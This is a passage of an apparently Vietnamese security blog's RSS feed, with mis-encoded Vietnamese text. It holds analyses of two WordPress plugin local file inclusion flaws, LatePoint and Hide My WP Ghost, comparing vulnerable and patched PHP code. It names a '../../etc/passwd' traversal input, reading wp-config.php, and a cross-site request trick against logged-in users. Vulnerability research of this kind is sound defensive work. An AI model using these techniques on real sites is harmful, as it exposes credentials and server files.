quy·ªÅn&lt;/p&gt;&#xA;&lt;p&gt;&lt;strong&gt;Result&lt;/strong&gt;:&lt;/p&gt;&#xA;&lt;p&gt;Debugger ƒë√£ nh·∫£y ƒë·∫øn &lt;code&gt;wp-config.php&lt;/code&gt;&lt;/p&gt;&#xA;&lt;figure&gt;&lt;img src=&#34;http://localhost:1313/posts/2025-10-19-cve-2025-6715/result.png&#34;&#xA;    alt=&#34;K·∫øt qu·∫£ LFI th√†nh c√¥ng&#34;&gt;&lt;figcaption&gt;&#xA;      &lt;p&gt;K·∫øt qu·∫£ LFI th√†nh c√¥ng&lt;/p&gt;&#xA;    &lt;/figcaption&gt;&#xA;&lt;/figure&gt;&#xA;&#xA;&lt;div class=&#34;details admonition info open disabled&#34;&gt;&#xA;  &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-circle-info&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;Th√¥ng tin&lt;/div&gt;&#xA;  &lt;div class=&#34;details-content&#34;&gt;&#xA;    &lt;div class=&#34;admonition-content&#34;&gt;&lt;p&gt;V√¨ ƒë√¢y l√† CVE ƒë∆∞·ª£c c√¥ng b·ªë &lt;strong&gt;Unauthenticated&lt;/strong&gt;, n√™n ta t·∫≠n d·ª•ng plugin kh√¥ng check &lt;code&gt;nonce&lt;/code&gt; ƒë·ªÉ ng∆∞·ªùi d√πng ƒë√£ ƒëƒÉng nh·∫≠p truy c·∫≠p v√†o link trang web ƒë·ªôc h·∫°i r·ªìi t·ª± g·ª≠i request ƒë·∫øn trang WordPress ƒë√≥ k√®m theo cookie.&lt;/p&gt;&lt;/div&gt;&#xA;  &lt;/div&gt;&#xA;&lt;/div&gt;&lt;h3 class=&#34;heading-element&#34; id=&#34;conclusion&#34;&gt;&lt;span&gt;Conclusion&lt;/span&gt;&#xA;  &lt;a href=&#34;#conclusion&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;p&gt;Phi√™n b·∫£n &lt;strong&gt;‚â§ 5.1.93&lt;/strong&gt; c·ªßa LatePoint cho ph√©p &lt;strong&gt;LFI&lt;/strong&gt; v√¨ tham s·ªë &lt;code&gt;layout&lt;/code&gt; kh√¥ng ƒë∆∞·ª£c x√°c th·ª±c tr∆∞·ªõc khi &lt;code&gt;include()&lt;/code&gt;, d·∫´n t·ªõi kh·∫£ nƒÉng &lt;strong&gt;ƒë·ªçc t·ªáp c·ª•c b·ªô&lt;/strong&gt; (v√≠ d·ª• &lt;code&gt;wp-config.php&lt;/code&gt;). L·ªó h·ªïng ƒë∆∞·ª£c v√° trong &lt;strong&gt;5.1.94&lt;/strong&gt; b·∫±ng c√°ch l·ªçc k√Ω t·ª±, d√πng &lt;code&gt;realpath()&lt;/code&gt; v√† gi·ªõi h·∫°n th∆∞ m·ª•c h·ª£p l·ªá.&lt;/p&gt;&#xA;&lt;h3 class=&#34;heading-element&#34; id=&#34;key-takeaways&#34;&gt;&lt;span&gt;Key takeaways&lt;/span&gt;&#xA;  &lt;a href=&#34;#key-takeaways&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;ul&gt;&#xA;&lt;li&gt;ƒê√¢y l√† &lt;strong&gt;LFI (ƒë·ªçc file)&lt;/strong&gt; ‚Äî kh√¥ng c√≥ b·∫±ng ch·ª©ng RCE trong PoC.&lt;/li&gt;&#xA;&lt;li&gt;Tham s·ªë ƒëi·ªÅu khi·ªÉn ƒë∆∞·ªùng d·∫´n ph·∫£i ƒë∆∞·ª£c &lt;strong&gt;sanitize + canonicalize&lt;/strong&gt; tr∆∞·ªõc khi d√πng.&lt;/li&gt;&#xA;&lt;li&gt;D√πng &lt;strong&gt;realpath()&lt;/strong&gt; v√† &lt;strong&gt;ki·ªÉm tra base dir&lt;/strong&gt; ƒë·ªÉ ngƒÉn traversal.&lt;/li&gt;&#xA;&lt;li&gt;Kh√¥ng &lt;strong&gt;include&lt;/strong&gt; tr·ª±c ti·∫øp d·ªØ li·ªáu t·ª´ request; x√¢y h√†m an to√†n nh∆∞ &lt;code&gt;get_safe_layout_path()&lt;/code&gt;.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;references&#34;&gt;&lt;span&gt;References&lt;/span&gt;&#xA;  &lt;a href=&#34;#references&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;&lt;a href=&#34;https://book.hacktricks.wiki/en/pentesting-web/file-inclusion/index.html?highlight=lfi#lfi--rfi-using-php-wrappers--protocols&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;File Inclusion/Path traversal ‚Äî Hacktrick&lt;/a&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;a href=&#34;https://patchstack.com/database/wordpress/plugin/latepoint/vulnerability/wordpress-latepoint-plugin-5-1-94-unauthenticated-lfi-vulnerability&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt; WordPress LatePoint Plugin &amp;lt;= 5.1.93 is vulnerable to Local File Inclusion &lt;/a&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>CVE-2025-26909 Analysis &amp; POC</title>
      <link>http://localhost:1313/vi/posts/2025-10-18-cve-2025-26909/</link>
      <pubDate>Sat, 18 Oct 2025 19:00:00 +0700</pubDate><author>w41bu1@gmail.com (Bui Van Y)</author>
      <guid>http://localhost:1313/vi/posts/2025-10-18-cve-2025-26909/</guid>
      <category domain="http://localhost:1313/vi/categories/cve-analysis/">CVE Analysis</category>
      <description>&lt;img src=&#34;http://localhost:1313/posts/2025-10-18-cve-2025-26909/app.png&#34; alt=&#34;featured image&#34; referrerpolicy=&#34;no-referrer&#34;&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;cve--basic-info&#34;&gt;&lt;span&gt;CVE &amp;amp; Basic Info&lt;/span&gt;&#xA;  &lt;a href=&#34;#cve--basic-info&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;Plugin &lt;strong&gt;Hide My WP Ghost&lt;/strong&gt; phi√™n b·∫£n &lt;strong&gt;‚â§ 5.4.01&lt;/strong&gt; ch·ª©a l·ªó h·ªïng &lt;strong&gt;Local File Inclusion&lt;/strong&gt; cho ph√©p k·∫ª t·∫•n c√¥ng kh√¥ng c·∫ßn x√°c th·ª±c ƒëi·ªÅu khi·ªÉn tham s·ªë file trong l·ªánh &lt;code&gt;include/require&lt;/code&gt;, t·ª´ ƒë√≥ ch√®n ho·∫∑c ƒë·ªçc c√°c t·ªáp c·ª•c b·ªô tr√™n m√°y ch·ªß (v√≠ d·ª• file c·∫•u h√¨nh ch·ª©a credential), d·∫´n t·ªõi r√≤ r·ªâ th√¥ng tin nh·∫°y c·∫£m v√† trong m·ªôt s·ªë c·∫•u h√¨nh c√≥ th·ªÉ d·∫´n t·ªõi th·ª±c thi m√£.&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVE ID&lt;/strong&gt;: &lt;a href=&#34;https://www.cve.org/CVERecord?id=CVE-2025-26909&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;CVE-2025-26909&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Vulnerability Type&lt;/strong&gt;: Local File Inclusion&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Affected Versions&lt;/strong&gt;: &amp;lt;= 5.4.01&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Patched Versions&lt;/strong&gt;: 5.4.02&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVSS severity&lt;/strong&gt;: High (9.6)&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Required Privilege&lt;/strong&gt;: Unauthenticated&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Product&lt;/strong&gt;: &lt;a href=&#34;https://wordpress.org/plugins/hide-my-wp/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress Hide My WP Ghost Plugin&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;requirements&#34;&gt;&lt;span&gt;Requirements&lt;/span&gt;&#xA;  &lt;a href=&#34;#requirements&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;Local WordPress &amp;amp; Debugging&lt;/strong&gt;: &lt;a href=&#34;https://w41bu1.github.io/2025-08-21-wordpress-local-and-debugging/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Local WordPress and Debugging&lt;/a&gt;.&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Plugin versions&lt;/strong&gt; - &lt;strong&gt;Hide My WP Ghost&lt;/strong&gt;: &lt;strong&gt;5.3.02&lt;/strong&gt; (vulnerable) v√† &lt;strong&gt;5.4.02&lt;/strong&gt; (patched).&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Diff tool&lt;/strong&gt; - &lt;a href=&#34;https://meldmerge.org/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;strong&gt;Meld&lt;/strong&gt;&lt;/a&gt; ho·∫∑c b·∫•t k·ª≥ c√¥ng c·ª• so s√°nh (diff) n√†o ƒë·ªÉ ki·ªÉm tra v√† so s√°nh kh√°c bi·ªát gi·ªØa hai phi√™n b·∫£n.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;analysis&#34;&gt;&lt;span&gt;Analysis&lt;/span&gt;&#xA;  &lt;a href=&#34;#analysis&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;h3 class=&#34;heading-element&#34; id=&#34;patch-diff&#34;&gt;&lt;span&gt;Patch diff&lt;/span&gt;&#xA;  &lt;a href=&#34;#patch-diff&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;p&gt;&lt;strong&gt;B·∫£n l·ªói&lt;/strong&gt;:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;public function getOriginalUrl( $url ) {&#xA;&#xA;    // Build the rewrite rules if they are not already built&#xA;    if ( empty( $this-&amp;gt;_rewrites ) ) {&#xA;        $this-&amp;gt;buildRedirect();&#xA;    }&#xA;&#xA;    // Parse the URL components&#xA;    $parse_url = wp_parse_url( $url );&#xA;&#xA;    // Get the home root path&#xA;    $path = wp_parse_url( home_url(), PHP_URL_PATH );&#xA;&#xA;    // Backslash the paths&#xA;    if ( $path &amp;lt;&amp;gt; &amp;#39;&amp;#39; ) {&#xA;        $parse_url[&amp;#39;path&amp;#39;] = preg_replace( &amp;#39;/^&amp;#39; . preg_quote( $path, &amp;#39;/&amp;#39; ) . &amp;#39;/&amp;#39;, &amp;#39;&amp;#39;, $parse_url[&amp;#39;path&amp;#39;] );&#xA;    }&#xA;&#xA;    // Replace paths to original based on rewrite rules&#xA;    if ( isset( $this-&amp;gt;_rewrites[&amp;#39;from&amp;#39;] ) &amp;amp;&amp;amp; isset( $this-&amp;gt;_rewrites[&amp;#39;to&amp;#39;] ) &amp;amp;&amp;amp; ! empty( $this-&amp;gt;_rewrites[&amp;#39;from&amp;#39;] ) &amp;amp;&amp;amp; ! empty( $this-&amp;gt;_rewrites[&amp;#39;to&amp;#39;] ) ) {&#xA;        $parse_url[&amp;#39;path&amp;#39;] = preg_replace( $this-&amp;gt;_rewrites[&amp;#39;from&amp;#39;], $this-&amp;gt;_rewrites[&amp;#39;to&amp;#39;], $parse_url[&amp;#39;path&amp;#39;], 1 );&#xA;    }&#xA;&#xA;    // Default to https if the scheme is not set&#xA;    if ( ! isset( $parse_url[&amp;#39;scheme&amp;#39;] ) ) {&#xA;        $parse_url[&amp;#39;scheme&amp;#39;] = &amp;#39;https&amp;#39;;&#xA;    }&#xA;&#xA;    // Reconstruct the URL&#xA;    if ( isset( $parse_url[&amp;#39;port&amp;#39;] ) &amp;amp;&amp;amp; $parse_url[&amp;#39;port&amp;#39;] &amp;lt;&amp;gt; 80 ) {&#xA;        $new_url = $parse_url[&amp;#39;scheme&amp;#39;] . &amp;#39;://&amp;#39; . $parse_url[&amp;#39;host&amp;#39;] . &amp;#39;:&amp;#39; . $parse_url[&amp;#39;port&amp;#39;] . $path . $parse_url[&amp;#39;path&amp;#39;];&#xA;    } else {&#xA;        $new_url = $parse_url[&amp;#39;scheme&amp;#39;] . &amp;#39;://&amp;#39; . $parse_url[&amp;#39;host&amp;#39;] . $path . $parse_url[&amp;#39;path&amp;#39;];&#xA;    }&#xA;&#xA;    // Append query string if present&#xA;    if ( isset( $parse_url[&amp;#39;query&amp;#39;] ) &amp;amp;&amp;amp; ! empty( $parse_url[&amp;#39;query&amp;#39;] ) ) {&#xA;        $query   = $parse_url[&amp;#39;query&amp;#39;];&#xA;        $query   = str_replace( array( &amp;#39;?&amp;#39;, &amp;#39;%3F&amp;#39; ), &amp;#39;&amp;amp;&amp;#39;, $query );&#xA;        $new_url .= ( ! strpos( $new_url, &amp;#39;?&amp;#39; ) ? &amp;#39;?&amp;#39; : &amp;#39;&amp;amp;&amp;#39; ) . $query;&#xA;    }&#xA;&#xA;    // Return the constructed URL&#xA;    return $new_url;&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;H√†m &lt;code&gt;getOriginalUrl()&lt;/code&gt; d√πng ƒë·ªÉ ph√¢n t√≠ch v√† t√°i t·∫°o l·∫°i URL g·ªëc d·ª±a tr√™n c√°c quy t·∫Øc rewrite trong h·ªá th·ªëng.&lt;/p&gt;&#xA;&lt;p&gt;Trong phi√™n b·∫£n l·ªói, gi√° tr·ªã &lt;code&gt;$new_url&lt;/code&gt; kh√¥ng ƒë∆∞·ª£c l√†m s·∫°ch tr∆∞·ªõc khi tr·∫£ v·ªÅ, cho ph√©p k·∫ª t·∫•n c√¥ng ch√®n ƒë∆∞·ªùng d·∫´n ƒë·ªôc h·∫°i nh∆∞ &lt;code&gt;../../etc/passwd&lt;/code&gt; d·∫´n ƒë·∫øn nguy c∆° &lt;strong&gt;LFI&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;p&gt;&lt;strong&gt;B·∫£n v√°&lt;/strong&gt;:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;public function getOriginalUrl( $url ) {&#xA;&#xA;    // Build the rewrite rules if they are not already built&#xA;    if ( empty( $this-&amp;gt;_rewrites ) ) {&#xA;        $this-&amp;gt;buildRedirect();&#xA;    }&#xA;&#xA;    // Parse the URL components&#xA;    $parse_url = wp_parse_url( $url );&#xA;&#xA;    // Only if there is a path to change&#xA;    if( !isset( $parse_url[&amp;#39;path&amp;#39;] ) ) {&#xA;        return $url;&#xA;    }&#xA;&#xA;    // Get the home root path&#xA;    $path = wp_parse_url( home_url(), PHP_URL_PATH );&#xA;&#xA;    // Backslash the paths&#xA;    if ( $path &amp;lt;&amp;gt; &amp;#39;&amp;#39; ) {&#xA;        $parse_url[&amp;#39;path&amp;#39;] = preg_replace( &amp;#39;/^&amp;#39; . preg_quote( $path, &amp;#39;/&amp;#39; ) . &amp;#39;/&amp;#39;, &amp;#39;&amp;#39;, $parse_url[&amp;#39;path&amp;#39;] );&#xA;    }&#xA;&#xA;    // Replace paths to original based on rewrite rules&#xA;    if ( isset( $this-&amp;gt;_rewrites[&amp;#39;from&amp;#39;] ) &amp;amp;&amp;amp; isset( $this-&amp;gt;_rewrites[&amp;#39;to&amp;#39;] ) &amp;amp;&amp;amp; ! empty( $this-&amp;gt;_rewrites[&amp;#39;from&amp;#39;] ) &amp;amp;&amp;amp; ! empty( $this-&amp;gt;_rewrites[&amp;#39;to&amp;#39;] ) ) {&#xA;        $parse_url[&amp;#39;path&amp;#39;] = preg_replace( $this-&amp;gt;_rewrites[&amp;#39;from&amp;#39;], $this-&amp;gt;_rewrites[&amp;#39;to&amp;#39;], $parse_url[&amp;#39;path&amp;#39;], 1 );&#xA;    }&#xA;&#xA;    // Default to https if the scheme is not set&#xA;    if ( ! isset( $parse_url[&amp;#39;scheme&amp;#39;] ) ) {&#xA;        $parse_url[&amp;#39;scheme&amp;#39;] = &amp;#39;https&amp;#39;;&#xA;    }&#xA;&#xA;    // Reconstruct the URL&#xA;    if ( isset( $parse_url[&amp;#39;port&amp;#39;] ) &amp;amp;&amp;amp; $parse_url[&amp;#39;port&amp;#39;] &amp;lt;&amp;gt; 80 ) {&#xA;        $new_url = $parse_url[&amp;#39;scheme&amp;#39;] . &amp;#39;://&amp;#39; . $parse_url[&amp;#39;host&amp;#39;] . &amp;#39;:&amp;#39; . $parse_url[&amp;#39;port&amp;#39;] . $path . $parse_url[&amp;#39;path&amp;#39;];&#xA;    } else {&#xA;        $new_url = $parse_url[&amp;#39;scheme&amp;#39;] . &amp;#39;://&amp;#39; . $parse_url[&amp;#39;host&amp;#39;] . $path . $parse_url[&amp;#39;path&amp;#39;];&#xA;    }&#xA;&#xA;    // Append query string if present&#xA;    if ( isset( $parse_url[&amp;#39;query&amp;#39;] ) &amp;amp;&amp;amp; ! empty( $parse_url[&amp;#39;query&amp;#39;] ) ) {&#xA;        $query   = $parse_url[&amp;#39;query&amp;#39;];&#xA;        $query   = str_replace( array( &amp;#39;?&amp;#39;, &amp;#39;%3F&amp;#39; ), &amp;#39;&amp;amp;&amp;#39;, $query );&#xA;        $new_url .= ( ! strpos( $new_url, &amp;#39;?&amp;#39; ) ? &amp;#39;?&amp;#39; : &amp;#39;&amp;amp;&amp;#39; ) . $query;&#xA;    }&#xA;&#xA;    // Return the constructed URL&#xA;    return sanitize_url( $new_url );&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;B·∫£n v√° g·ªçi &lt;code&gt;sanitize_url($new_url)&lt;/code&gt; tr∆∞·ªõc khi tr·∫£ v·ªÅ, gi√∫p lo·∫°i b·ªè ƒë∆∞·ªùng d·∫´n ho·∫∑c scheme nguy hi·ªÉm, t·ª´ ƒë√≥ ngƒÉn ch·∫∑n kh·∫£ nƒÉng &lt;strong&gt;LFI&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;h3 class=&#34;heading-element&#34; id=&#34;vulnerable-code&#34;&gt;&lt;span&gt;Vulnerable Code&lt;/span&gt;&#xA;  &lt;a href=&#34;#vulnerable-code&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;p&gt;&lt;code&gt;getOriginalUrl()&lt;/code&gt; ƒë∆∞·ª£c g·ªçi trong h√†m &lt;code&gt;showFile()&lt;/code&gt;, g√°n gi√° tr·ªã tr·∫£ v·ªÅ cho &lt;code&gt;$new_url&lt;/code&gt;&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;public function showFile( $url ) {&#xA;    // other logic&#xA;    $new_url          = $this-&amp;gt;getOriginalUrl( $url );&#xA;    $new_url_no_query = ( ( strpos( $new_url, &amp;#39;?&amp;#39; ) !== false ) ? substr( $new_url, 0, strpos( $new_url, &amp;#39;?&amp;#39; ) ) : $new_url );&#xA;    $new_path         = $this-&amp;gt;getOriginalPath( $new_url );&#xA;    $ctype            = false;&#xA;&#xA;    if ( $ext = $this-&amp;gt;isFile( $new_url ) ) {&#xA;        // other logic&#xA;    } elseif ( strpos( trailingslashit( $new_url_no_query ), &amp;#39;/&amp;#39; . HMWP_Classes_Tools::getOption( &amp;#39;hmwp_login_url&amp;#39; ) . &amp;#39;/&amp;#39; ) || strpos( trailingslashit( $new_url_no_query ), &amp;#39;/&amp;#39; . HMWP_Classes_Tools::getDefault( &amp;#39;hmwp_login_url&amp;#39; ) . &amp;#39;/&amp;#39; ) ) {&#xA;        // other logic&#xA;    } elseif ( $url &amp;lt;&amp;gt; $new_url ) {&#xA;        if ( stripos( trailingslashit( $new_url_no_query ), &amp;#39;/&amp;#39; . HMWP_Classes_Tools::getDefault( &amp;#39;hmwp_wp-json&amp;#39; ) . &amp;#39;/&amp;#39; ) !== false ) {&#xA;            // other logic&#xA;        } elseif ( strpos( trailingslashit( $new_url_no_query ), &amp;#39;/&amp;#39; . HMWP_Classes_Tools::getDefault( &amp;#39;hmwp_activate_url&amp;#39; ) . &amp;#39;/&amp;#39; ) !== false || strpos( trailingslashit( $new_url_no_query ), &amp;#39;/&amp;#39; . HMWP_Classes_Tools::getDefault( 